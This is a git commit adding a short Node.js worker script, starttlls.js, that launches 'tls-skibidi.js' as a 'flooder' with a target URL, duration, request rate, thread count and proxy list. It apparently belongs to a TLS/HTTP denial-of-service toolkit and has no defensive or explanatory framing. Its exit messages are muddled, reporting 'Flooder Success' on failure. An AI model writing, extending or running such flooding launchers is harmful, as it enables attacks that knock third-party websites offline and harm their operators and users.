02a0beb8d18ff95c74a62621e3c5fc6e9689a409
Pham Huỳnh Quang <141423816+Quangqq@users.noreply.github.com>
2025-02-01 09:01:26 +0700

    Create starttlls.js

---
+++ starttlls.js
@@ -0,0 +1,31 @@
+const { parentPort, workerData } = require('worker_threads');
+const { spawn } = require('child_process');
+
+// Nhận dữ liệu từ workerData
+const { url, time, rate, thea, proxy } = workerData;
+const mode = 'skibidi';
+// Hàm chạy flooder.js
+function runFlooder() {
+    const flooder = spawn('node', ['tls-skibidi.js', url, time, rate, thea, proxy, mode]);
+
+    flooder.stdout.on('data', (data) => {
+        parentPort.postMessage(`Output: ${data}`);
+    });
+
+    flooder.stderr.on('data', (data) => {
+        parentPort.postMessage(`Error: ${data}`);
+    });
+
+    flooder.on('close', (code) => {
+        if (code === 0) {
+            parentPort.postMessage('Flooder successfully.');
+            process.exit(0);
+        } else {
+            parentPort.postMessage(`Flooder Success ${code}`);
+            process.exit(1);
+        }
+    });
+}
+
+// Chạy flooder
+runFlooder();
